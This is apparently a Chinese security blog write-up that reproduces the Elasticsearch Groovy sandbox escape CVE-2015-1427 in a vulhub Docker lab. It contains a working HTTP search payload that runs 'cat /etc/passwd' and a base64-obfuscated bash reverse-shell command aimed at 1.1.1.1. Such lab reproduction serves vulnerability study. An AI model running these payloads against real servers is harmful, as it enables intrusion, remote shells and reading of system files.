***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful
web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。

2014年爆出过一个远程代码执行漏洞(CVE-2014-3120),该漏洞产生原因是由于ElasticSearch使用的脚本引擎支持脚本代码MVEL作为表达式进行数据操作，攻击者可以通过MVEL构造执行任意java代码。

后来脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行。

漏洞影响范围:Elasticsearch 1.3.0-1.3.7 | 1.4.0-1.4.2

本文仅作漏洞复现记录与实现，利用流程如下:

## 一、漏洞环境搭建

本文漏洞环境采用vulhub搭建，执行以下命令开启环境

    
    
    cd /elasticsearch/CVE-2015-1427
    
    docker-compose build
    
    docker-compose up -d

执行完毕后访问9200端口，显示如下:

![1619512461_6087cc8df3508e261c437.png!small](https://image.3001.net/images/20210427/1619512461_6087cc8df3508e261c437.png!small)

漏洞链接:http://192.168.101.152:9200/

## 二、漏洞复现

利用该漏洞首先需要ElasticSearch存在至少一条数据，发送以下数据包添加数据

    
    
    POST /website/blog/ HTTP/1.1
    Host: 192.168.101.152:9200
    Content-Length: 21
    
    {
    "name": "test"
    }

![1619512634_6087cd3a1d2e31e030849.png!small](https://image.3001.net/images/20210427/1619512634_6087cd3a1d2e31e030849.png!small)

返回201表示添加成功，然后发送以下数据包执行命令

    
    
    POST /_search?pretty HTTP/1.1
    Host: 192.168.101.152:9200
    Content-Length: 410
    
    {"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"}}}

![1619512717_6087cd8dcd868853675f3.png!small](https://image.3001.net/images/20210427/1619512717_6087cd8dcd868853675f3.png!small)

命令执行成功

为了方便将shell反弹至服务器上

服务器执行nc -lvvp 监听端口

![1619513848_6087d1f85aa721bb1ec88.png!small](https://image.3001.net/images/20210427/1619513848_6087d1f85aa721bb1ec88.png!small)

之后执行以下命令反弹shell

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzg4NDEgMD4mMQ==}|{base64,-d}|{bash,-i}

成功反弹

![1619513935_6087d24fb1e9863378ba3.png!small](https://image.3001.net/images/20210427/1619513935_6087d24fb1e9863378ba3.png!small)

![1619513898_6087d22a1310783c489f3.png!small](https://image.3001.net/images/20210427/1619513898_6087d22a1310783c489f3.png!small)

